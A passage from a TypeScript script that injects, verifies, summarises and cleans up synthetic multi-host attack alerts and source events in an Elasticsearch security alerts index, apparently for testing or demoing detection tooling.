  console.log(`  Successfully injected: ${eventsInjected}/${allSourceEvents.length} source events`);

  // Step 2: Inject alerts
  console.log(`\n── Injecting ${docs.length} alerts ──`);
  const alertDocs = docs.map(({ id, source }) => ({ id, index, source }));
  const alertsInjected = await bulkIndex(client, alertDocs, 'alerts', dryRun);

  return { alertsInjected, eventsInjected };
}

async function cleanupAlerts(client: ESClient, dryRun: boolean): Promise<number> {
  let totalDeleted = 0;

  // Clean up alerts
  const { status: countStatus, body: countBody } = await client.post(
    '/.alerts-security.alerts-*/_count',
    { query: { term: { tags: INJECTED_TAG } } }
  );

  if (countStatus !== 200) {
    console.error(`  ERROR: Count failed (${countStatus}): ${JSON.stringify(countBody).slice(0, 200)}`);
  } else {
    const count = ((countBody as Record<string, unknown>).count as number) ?? 0;
    console.log(`  Found ${count} previously injected multi-host attack alerts`);

    if (count > 0) {
      if (dryRun) {
        console.log(`  [DRY RUN] Would delete ${count} alerts`);
      } else {
        const { status: delStatus, body: delBody } = await client.post(
          '/.alerts-security.alerts-*/_delete_by_query?refresh=true',
          { query: { term: { tags: INJECTED_TAG } } }
        );
        if (delStatus === 200) {
          const deleted = ((delBody as Record<string, unknown>).deleted as number) ?? 0;
          totalDeleted += deleted;
          console.log(`  Deleted ${deleted} alerts`);
        }
      }
    }
  }

  // Clean up source events
  const eventIndices = [
    'logs-endpoint.events.process-*',
    'logs-endpoint.events.file-*',
    'logs-endpoint.events.network-*',
  ];

  for (const idx of eventIndices) {
    const { status: evtCountStatus, body: evtCountBody } = await client.post(
      `/${idx}/_count`,
      { query: { term: { tags: SOURCE_EVENT_TAG } } }
    );

    if (evtCountStatus !== 200) continue;

    const evtCount = ((evtCountBody as Record<string, unknown>).count as number) ?? 0;
    if (evtCount === 0) continue;

    console.log(`  Found ${evtCount} source events in ${idx}`);

    if (dryRun) {
      console.log(`  [DRY RUN] Would delete ${evtCount} events from ${idx}`);
      continue;
    }

    const { status: evtDelStatus, body: evtDelBody } = await client.post(
      `/${idx}/_delete_by_query?refresh=true`,
      { query: { term: { tags: SOURCE_EVENT_TAG } } }
    );

    if (evtDelStatus === 200) {
      const deleted = ((evtDelBody as Record<string, unknown>).deleted as number) ?? 0;
      totalDeleted += deleted;
      console.log(`  Deleted ${deleted} events from ${idx}`);
    }
  }

  return totalDeleted;
}

async function verifyInjection(client: ESClient): Promise<void> {
  const { status, body } = await client.post('/.alerts-security.alerts-*/_search', {
    size: 0,
    query: { term: { tags: INJECTED_TAG } },
    aggs: {
      min_ts: { min: { field: '@timestamp' } },
      max_ts: { max: { field: '@timestamp' } },
      by_host: { terms: { field: 'host.name', size: 20 } },
      by_rule: { terms: { field: 'kibana.alert.rule.name', size: 30 } },
      by_severity: { terms: { field: 'kibana.alert.severity', size: 5 } },
      by_tactic: { terms: { field: 'kibana.alert.rule.threat.tactic.name', size: 20 } },
    },
  });

  if (status !== 200 || typeof body !== 'object' || body === null) return;

  const total = ((body as Record<string, unknown>).hits as Record<string, unknown>)?.total;
  const count = typeof total === 'object' ? (total as Record<string, unknown>).value : total;
  console.log(`  Total alerts: ${count}`);

  const aggs = (body as Record<string, unknown>).aggregations as Record<string, unknown> | undefined;
  if (!aggs) return;

  const minTs = (aggs.min_ts as Record<string, unknown>)?.value_as_string ?? '?';
  const maxTs = (aggs.max_ts as Record<string, unknown>)?.value_as_string ?? '?';
  console.log(`  Time range: ${minTs} → ${maxTs}`);

  type Bucket = { key: string; doc_count: number };
  const printBuckets = (label: string, field: string) => {
    const buckets = ((aggs[field] as Record<string, unknown>)?.buckets ?? []) as Bucket[];
    if (buckets.length === 0) return;
    console.log(`  ${label}:`);
    for (const b of buckets) {
      console.log(`    ${b.key}: ${b.doc_count}`);
    }
  };

  printBuckets('By host', 'by_host');
  printBuckets('By severity', 'by_severity');
  printBuckets('By tactic', 'by_tactic');
  printBuckets('By rule', 'by_rule');
}

function printSummary(docs: PreparedAlert[]): void {
  const byHost: Record<string, number> = {};
  const byRule: Record<string, number> = {};
  const bySeverity: Record<string, number> = {};
  const byTactic: Record<string, number> = {};
  const byEventType: Record<string, number> = {};

  let totalSourceEvents = 0;

  for (const { source, sourceEvents } of docs) {
    const host =
      typeof source.host === 'object' && source.host !== null
        ? ((source.host as Record<string, unknown>).name as string) ?? 'unknown'
        : 'unknown';
    const rule = (source['kibana.alert.rule.name'] as string) ?? 'unknown';
    const severity = (source['kibana.alert.severity'] as string) ?? 'unknown';
    const threats = (source['kibana.alert.rule.threat'] as Array<{ tactic: { name: string } }>) ?? [];

    byHost[host] = (byHost[host] ?? 0) + 1;
    byRule[rule] = (byRule[rule] ?? 0) + 1;
    bySeverity[severity] = (bySeverity[severity] ?? 0) + 1;
    for (const t of threats) {
      byTactic[t.tactic.name] = (byTactic[t.tactic.name] ?? 0) + 1;
    }

    totalSourceEvents += sourceEvents.length;
    for (const evt of sourceEvents) {
      const ds = (evt.source.data_stream as Record<string, unknown>)?.dataset as string ?? 'unknown';
      byEventType[ds] = (byEventType[ds] ?? 0) + 1;
    }
  }

  console.log(`\n── Alert Summary ──`);
  console.log(`  Total alerts: ${docs.length}`);
  console.log(`  Total source events: ${totalSourceEvents}`);

  console.log(`\n  Source events by type:`);
  for (const [t, c] of Object.entries(byEventType).sort((a, b) => b[1] - a[1])) {
    console.log(`    ${t}: ${c}`);
  }

  console.log(`\n  By host:`);
  for (const [h, c] of Object.entries(byHost).sort((a, b) => b[1] - a[1])) {
    console.log(`    ${h}: ${c}`);
  }

  console.log(`\n  By severity:`);
  for (const [s, c] of Object.entries(bySeverity).sort((a, b) => b[1] - a[1])) {
    console.log(`    ${s}: ${c}`);
  }

  console.log(`\n  By tactic:`);
  for (const [t, c] of Object.entries(byTactic).sort((a, b) => b[1] - a[1])) {
    console.log(`    ${t}: ${c}`);
  }

  console.log(`\n  By rule:`);
  for (const [r, c] of Object.entries(byRule).sort((a, b) => b[1] - a[1])) {
    console.log(`    ${r}: ${c}`);
  }
}

// ── Argument Parsing ──

function parseArgs(argv: string[]): ParsedArgs {
  const args: ParsedArgs = {
    esUrl: '',
    insecure: false,
    host1: DEFAULT_HOST1,
    host2: DEFAULT_HOST2,
    host3: DEFAULT_HOST3,
    index: DEFAULT_ALERT_INDEX,
    dryRun: false,
    cleanup: false,
    summaryOnly: false,
  };

  for (let i = 2; i < argv.length; i++) {
    const arg = argv[i];
    const next = () => argv[++i];

    switch (arg) {
      case '--es-url':
        args.esUrl = next();
        break;
      case '--api-key':
        args.apiKey = next();
        break;
      case '--user':
      case '-u':
        args.user = next();
        break;
      case '--password':
      case '-p':
        args.password = next();
        break;
      case '--insecure':
      case '-k':
        args.insecure = true;
        break;
      case '--host1':
        args.host1 = next();
        break;
      case '--host2':
        args.host2 = next();
        break;
      case '--host3':
        args.host3 = next();
        break;
      case '--index':
        args.index = next();
        break;
      case '--dry-run':
        args.dryRun = true;
        break;
      case '--cleanup':
        args.cleanup = true;
        break;
      case '--summary-only':
        args.summaryOnly = true;
        break;
      case '--help':
      case '-h':
        printUsage();
        process.exit(0);
        break;
      default:
        console.error(`Unknown argument: ${arg}`);
        printUsage();
        process.exit(1);
    }
  }

  return args;
}

function printUsage(): void {
  console.log(`
Usage: npx tsx recreate_multi_host_attack.ts [options]

Connection:
  --es-url <url>        Elasticsearch URL (required)
  --api-key <key>       API key (base64 encoded)
  --user, -u <user>     Username for basic auth
  --password, -p <pwd>  Password for basic auth
  --insecure, -k        Skip TLS verification

Host Names:
  --host1 <name>        Attack origin host (default: ${DEFAULT_HOST1})
  --host2 <name>        Lateral movement target (default: ${DEFAULT_HOST2})
  --host3 <name>        Noise-only host (default: ${DEFAULT_HOST3})

Options:
  --index <index>       Target index (default: ${DEFAULT_ALERT_INDEX})
  --dry-run             Show what would be done without making changes
  --cleanup             Remove previously injected attack alerts
  --summary-only        Print alert summary and exit
  --help, -h            Show this help message

Examples:
  # Inject into local dev cluster
  npx tsx recreate_multi_host_attack.ts --es-url http://localhost:9200 -u elastic -p changeme

  # Inject into cloud cluster with custom host names
  npx tsx recreate_multi_host_attack.ts --es-url https://cluster:9243 --api-key <key> \\
    --host1 web-server --host2 db-server --host3 monitoring-node

  # Dry run
  npx tsx recreate_multi_host_attack.ts --es-url http://localhost:9200 -u elastic -p changeme --dry-run

  # Cleanup
  npx tsx recreate_multi_host_attack.ts --es-url http://localhost:9200 -u elastic -p changeme --cleanup
`);
}

// ── Main ──

async function main(): Promise<void> {
  const args = parseArgs(process.argv);

  if (args.insecure) {
    process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
  }

  console.log(`\n── Multi-Host Attack Alert Generator ──`);
  console.log(`  Hosts: ${args.host1} (attack origin), ${args.host2} (lateral target), ${args.host3} (noise)`);

  // Generate alerts
  const prepared = prepareAlerts(args);
  printSummary(prepared);

  if (args.summaryOnly) {
    process.exit(0);
  }

  // Validate connection
  if (!args.esUrl) {
    console.error('\nERROR: --es-url is required');
    process.exit(1);
  }
  if (!args.apiKey && !(args.user && args.password)) {
    console.error('\nERROR: Provide --api-key or --user + --password');
    process.exit(1);
  }

  const client = new ESClient({
    baseUrl: args.esUrl,
    apiKey: args.apiKey,
    user: args.user,
    password: args.password,
  });

  // Connect
  console.log(`\n── Connecting to ${args.esUrl} ──`);
  const healthy = await checkCluster(client);
  if (!healthy && !args.dryRun) {
    process.exit(1);
  }

  // Cleanup
  if (args.cleanup) {
    console.log(`\n── Cleaning up alerts and source events ──`);
    const deleted = await cleanupAlerts(client, args.dryRun);
    if (!args.dryRun) {
      console.log(`\n  Total deleted: ${deleted} documents`);
    }
    process.exit(0);
  }

  // Check index
  const { status: idxStatus } = await client.head('/.alerts-security.alerts-*');
  if (idxStatus !== 200) {
    console.warn(`\n  WARNING: .alerts-security.alerts-* not found.`);
    console.warn(`  Ensure at least one detection rule has executed to create the alert index.`);
  }

  // Inject
  const { alertsInjected, eventsInjected } = await injectAlerts(client, prepared, args.index, args.dryRun);

  if (!args.dryRun) {
    console.log(`\n  Successfully injected: ${alertsInjected}/${prepared.length} alerts, ${eventsInjected} source events`);
  }

  // Verify
  if (!args.dryRun && alertsInjected > 0) {
    console.log(`\n── Verification ──`);
    await verifyInjection(client);
  }

  // Done
  console.log(`\n── Done ──`);
  if (!args.dryRun && alertsInjected > 0) {
    console.log(`\nTo clean up later:`);
    console.log(
      `  npx tsx recreate_multi_host_attack.ts --es-url ${args.esUrl} ${args.apiKey ? '--api-key <key>' : '-u elastic -p changeme'} --cleanup`
    );
  }
}

main().catch((err) => {
  console.error('Fatal error:', err);
  process.exit(1);
});
